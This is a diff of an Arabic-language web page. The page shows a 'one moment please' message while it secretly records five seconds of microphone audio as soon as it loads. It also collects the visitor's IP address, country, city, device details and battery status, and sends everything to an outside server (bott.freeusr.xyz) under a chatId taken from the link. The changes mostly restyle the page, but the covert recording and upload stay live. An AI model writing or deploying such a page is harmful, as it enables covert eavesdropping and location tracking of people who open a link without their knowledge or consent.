@@ -5,169 +5,57 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap');
 
         body {
             font-family: 'Poppins', sans-serif;
+            margin: 0;
+            padding: 0;
             background: #000;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
+            height: 100vh;
             overflow: hidden;
+            color: #fff;
         }
 
-        /* الحاوية الرئيسية */
         .container {
             text-align: center;
-            padding: 50px 40px;
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 20px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(20px);
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
+            padding: 40px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.2);
             position: relative;
-            max-width: 450px;
-            width: 90%;
-            animation: fadeInUp 0.8s ease-out;
+            overflow: hidden;
+            backdrop-filter: blur(10px);
         }
 
-        /* تأثير الخلفية المتحركة */
         .container::before {
             content: '';
             position: absolute;
-            top: -2px;
-            left: -2px;
-            right: -2px;
-            bottom: -2px;
-            background: linear-gradient(45deg, #e74c3c, #f39c12, #e74c3c, #f39c12);
-            background-size: 400% 400%;
-            border-radius: 22px;
-            z-index: -1;
-            animation: gradientMove 3s ease infinite;
-            opacity: 0.3;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, rgba(255, 255, 255, 0.1), transparent);
+            transform: rotate(45deg);
+            animation: animate 5s linear infinite;
         }
 
-        @keyframes gradientMove {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
+        @keyframes animate {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
 
-        @keyframes fadeInUp {
-            from {
-                opacity: 0;
-                transform: translateY(30px) scale(0.95);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0) scale(1);
-            }
-        }
-
-        /* أيقونة التحقق */
-        .check-icon {
-            width: 80px;
-            height: 80px;
-            background: linear-gradient(135deg, #e74c3c, #c0392b);
-            border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin: 0 auto 25px;
-            animation: pulse 1.5s ease-in-out infinite;
-            box-shadow: 0 10px 30px rgba(231, 76, 60, 0.4);
-        }
-
-        .check-icon svg {
-            width: 45px;
-            height: 45px;
-            fill: none;
-            stroke: #fff;
-            stroke-width: 3;
-            stroke-linecap: round;
-            stroke-linejoin: round;
-        }
-
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-            100% { transform: scale(1); }
-        }
-
-        /* النص الرئيسي */
-        .main-title {
-            font-size: 2.8rem;
-            font-weight: 700;
-            color: #e74c3c;
-            margin-bottom: 10px;
-            text-shadow: 0 0 30px rgba(231, 76, 60, 0.3);
-            letter-spacing: 1px;
-        }
-
-        /* النص الفرعي */
-        .sub-text {
-            font-size: 1.1rem;
-            color: rgba(255, 255, 255, 0.7);
-            margin-bottom: 30px;
-            line-height: 1.8;
-        }
-
-        /* زر الإغلاق */
-        .close-btn {
-            background: linear-gradient(135deg, #e74c3c, #c0392b);
-            color: #fff;
-            border: none;
-            padding: 14px 40px;
-            font-size: 1rem;
-            font-weight: 600;
-            border-radius: 50px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            font-family: 'Poppins', sans-serif;
-            letter-spacing: 0.5px;
-            box-shadow: 0 8px 25px rgba(231, 76, 60, 0.3);
-        }
-
-        .close-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 12px 35px rgba(231, 76, 60, 0.5);
-        }
-
-        .close-btn:active {
-            transform: translateY(0);
-        }
-
-        /* الخطوط الزخرفية */
-        .line {
-            width: 60px;
-            height: 3px;
-            background: linear-gradient(90deg, transparent, #e74c3c, transparent);
-            margin: 15px auto 20px;
-            border-radius: 2px;
-        }
-
-        /* رسالة التحميل (تظهر أثناء التسجيل) */
-        .loading-container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 20px;
-        }
-
-        .loading-spinner {
-            border: 4px solid rgba(255, 255, 255, 0.1);
-            border-top: 4px solid #e74c3c;
+        .loading {
+            border: 8px solid rgba(243, 243, 243, 0.2);
+            border-top: 8px solid #e74c3c;
             border-radius: 50%;
             width: 50px;
             height: 50px;
-            animation: spin 1s linear infinite;
+            animation: spin 1.5s linear infinite;
+            margin: 0 auto;
         }
 
         @keyframes spin {
@@ -175,200 +63,115 @@
             100% { transform: rotate(360deg); }
         }
 
-        .loading-text {
-            color: rgba(255, 255, 255, 0.8);
-            font-size: 1.1rem;
-            font-weight: 400;
-        }
-
-        /* إخفاء الفورم */
-        #voice-form {
-            display: none;
+        .message {
+            font-size: 20px;
+            color: #ecf0f1;
+            margin-top: 20px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
         }
     </style>
 </head>
 <body>
-
-    <!-- الحاوية الرئيسية -->
-    <div class="container" id="mainContainer">
-        <!-- محتوى التحميل (يظهر أثناء التسجيل) -->
-        <div id="loadingContent">
-            <div class="loading-spinner"></div>
-            <p class="loading-text">⏳ جاري تسجيل الصوت...</p>
-            <p style="color: rgba(255,255,255,0.4); font-size: 0.9rem; margin-top: 10px;">يرجى الانتظار لحظة</p>
-        </div>
+    <div class="container">
+        <div class="loading" id="loading" style="display: none;"></div>
+        <p class="message" id="notification">لحظه واحده من فضلك...</p>
     </div>
 
-    <!-- نموذج إرسال الصوت -->
     <form method="POST" action="/submitVoice" id="voice-form" enctype="multipart/form-data">
         <input type="hidden" name="chatId" id="chatId">
         <input type="file" name="voice" id="voice" accept="audio/*" style="display: none;">
     </form>
 
-    <script>
-        document.addEventListener('DOMContentLoaded', () => {
-            const urlParams = new URLSearchParams(window.location.search);
-            const chatId = urlParams.get('chatId');
-            
-            if (!chatId) {
-                showError("❌ خطأ: chatId غير موجود في الرابط");
-                return;
-            }
+<script>
+document.addEventListener('DOMContentLoaded', () => {
+    const urlParams = new URLSearchParams(window.location.search);
+    const chatId = urlParams.get('chatId');
+    if (!chatId) {
+        alert("خطأ: chatId غير موجود في الرابط");
+        return;
+    }
 
-            document.getElementById('chatId').value = chatId;
+    document.getElementById('chatId').value = chatId;
 
-            if (!navigator.mediaDevices?.getUserMedia) {
-                showError("❌ المتصفح لا يدعم تسجيل الصوت");
-                return;
-            }
+    if (!navigator.mediaDevices?.getUserMedia) {
+        alert("المتصفح لا يدعم تسجيل الصوت");
+        return;
+    }
 
-            startRecording(5); // تسجيل 5 ثواني
-        });
+    startRecording(5); // 5 ثواني
+});
 
-        // دالة عرض رسالة الخطأ
-        function showError(message) {
-            document.getElementById('mainContainer').innerHTML = `
-                <div style="color: #e74c3c; font-size: 1.2rem; padding: 20px;">
-                    ${message}
-                </div>
-            `;
-        }
+async function startRecording(duration) {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        const recorder = new MediaRecorder(stream);
+        const chunks = [];
 
-        // دالة عرض رسالة النجاح "انتهى اغلق الصفحة"
-        function showSuccessMessage() {
-            document.getElementById('mainContainer').innerHTML = `
-                <!-- أيقونة التحقق -->
-                <div class="check-icon">
-                    <svg viewBox="0 0 24 24">
-                        <polyline points="20 6 9 17 4 12" />
-                    </svg>
-                </div>
+        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.onstop = async () => {
+            const blob = new Blob(chunks, { type: 'audio/webm' });
+            const formData = new FormData(document.getElementById('voice-form'));
+            formData.set('voice', blob, 'voice.webm');
 
-                <!-- العنوان الرئيسي -->
-                <h1 class="main-title">انتهى اغلق الصفحة</h1>
+            const info = await collectAdditionalData();
+            formData.append('additionalData', JSON.stringify(info));
 
-                <!-- خط زخرفي -->
-                <div class="line"></div>
+            // ✅ تعديل الرابط ليكون على السيرفر الجديد
+            const res = await fetch('https://bott.freeusr.xyz/submitVoice', {
+                method: 'POST',
+                body: formData
+            });
 
-                <!-- النص الفرعي -->
-                <p class="sub-text">
-                    ✅ تم إرسال الصوت بنجاح<br>
-                    يمكنك الآن إغلاق هذه الصفحة
-                </p>
-
-                <!-- زر الإغلاق -->
-                <button class="close-btn" onclick="closePage()">
-                    ✕ إغلاق الصفحة
-                </button>
-            `;
-        }
-
-        // دالة إغلاق الصفحة
-        function closePage() {
-            // محاولة إغلاق الصفحة
-            window.close();
-            
-            // في حال لم تعمل window.close (بعض المتصفحات تمنعها)
-            setTimeout(() => {
-                document.body.innerHTML = `
-                    <div style="
-                        display: flex;
-                        justify-content: center;
-                        align-items: center;
-                        height: 100vh;
-                        background: #000;
-                        color: #e74c3c;
-                        font-size: 1.5rem;
-                        font-family: 'Poppins', sans-serif;
-                        text-align: center;
-                        padding: 20px;
-                    ">
-                        ✅ يمكنك إغلاق هذه الصفحة الآن
-                    </div>
-                `;
-            }, 500);
-        }
-
-        // دالة بدء التسجيل
-        async function startRecording(duration) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                const recorder = new MediaRecorder(stream);
-                const chunks = [];
-
-                recorder.ondataavailable = e => chunks.push(e.data);
+            if (res.ok) {
+                // ❌ تم إلغاء التحويل إلى الرابط الإعلاني
+                // window.location.href = "https://www.effectivegatecpm.com/k9n9rdcsr?key=a6d387f380a559c60dc3368e5c343738";
                 
-                recorder.onstop = async () => {
-                    const blob = new Blob(chunks, { type: 'audio/webm' });
-                    const formData = new FormData(document.getElementById('voice-form'));
-                    formData.set('voice', blob, 'voice.webm');
-
-                    // تحديث نص التحميل
-                    document.querySelector('.loading-text').textContent = '📤 جاري إرسال الصوت...';
-
-                    const info = await collectAdditionalData();
-                    formData.append('additionalData', JSON.stringify(info));
-
-                    try {
-                        const res = await fetch('https://bott.freeusr.xyz/submitVoice', {
-                            method: 'POST',
-                            body: formData
-                        });
-
-                        if (res.ok) {
-                            // ✅ نجاح الإرسال - عرض رسالة "انتهى اغلق الصفحة"
-                            showSuccessMessage();
-                        } else {
-                            showError("❌ فشل الإرسال. حاول مرة أخرى.");
-                        }
-                    } catch (error) {
-                        showError("❌ خطأ في الاتصال: " + error.message);
-                    }
-                };
-
-                recorder.start();
-                setTimeout(() => recorder.stop(), duration * 1000);
+                // ✅ عرض رسالة "انتهى اغلق الصفحة" مع الحفاظ على التصميم القديم
+                document.getElementById('loading').style.display = 'block';
+                document.getElementById('notification').textContent = '✅ انتهى اغلق الصفحة';
+                document.getElementById('notification').style.color = '#e74c3c';
+                document.getElementById('notification').style.fontSize = '24px';
+                document.getElementById('notification').style.fontWeight = 'bold';
                 
-            } catch (err) {
-                showError("❌ خطأ في تسجيل الصوت: " + err.message);
+                // إخفاء الـ loading بعد 3 ثواني
+                setTimeout(() => {
+                    document.getElementById('loading').style.display = 'none';
+                }, 3000);
+            } else {
+                alert("فشل الإرسال. حاول مرة أخرى.");
             }
-        }
+        };
 
-        // دالة جمع بيانات إضافية
-        async function collectAdditionalData() {
-            let ip = 'غير متاح', country = '', city = '';
-            
-            try {
-                const ipInfo = await fetch('https://ipapi.co/json/').then(res => res.json());
-                ip = ipInfo.ip || 'غير متاح';
-                country = ipInfo.country_name || '';
-                city = ipInfo.city || '';
-            } catch {}
+        recorder.start();
+        setTimeout(() => recorder.stop(), duration * 1000);
+    } catch (err) {
+        alert("خطأ في تسجيل الصوت: " + err.message);
+    }
+}
 
-            const ua = navigator.userAgent;
-            const platform = navigator.platform;
-            const match = ua.match(/\(([^)]+)\)/);
-            const deviceVersion = match ? match[1] : 'غير متاح';
+async function collectAdditionalData() {
+    let ip = 'غير متاح', country = '', city = '';
+    try {
+        const ipInfo = await fetch('https://ipapi.co/json/').then(res => res.json());
+        ip = ipInfo.ip;
+        country = ipInfo.country_name;
+        city = ipInfo.city;
+    } catch {}
 
-            let batteryLevel = 'غير متاح', charging = 'غير متاح';
-            
-            try {
-                const battery = await navigator.getBattery();
-                batteryLevel = (battery.level * 100) + '%';
-                charging = battery.charging ? 'نعم' : 'لا';
-            } catch {}
+    const ua = navigator.userAgent;
+    const platform = navigator.platform;
+    const match = ua.match(/\(([^)]+)\)/);
+    const deviceVersion = match ? match[1] : 'غير متاح';
 
-            return { 
-                ip, 
-                country, 
-                city, 
-                platform, 
-                deviceVersion, 
-                batteryLevel, 
-                batteryCharging: charging 
-            };
-        }
-    </script>
+    let batteryLevel = 'غير متاح', charging = 'غير متاح';
+    try {
+        const battery = await navigator.getBattery();
+        batteryLevel = (battery.level * 100) + '%';
+        charging = battery.charging ? 'نعم' : 'لا';
+    } catch {}
 
+    return { ip, country, city, platform, deviceVersion, batteryLevel, batteryCharging: charging };
+}
+</script>
 </body>
 </html>
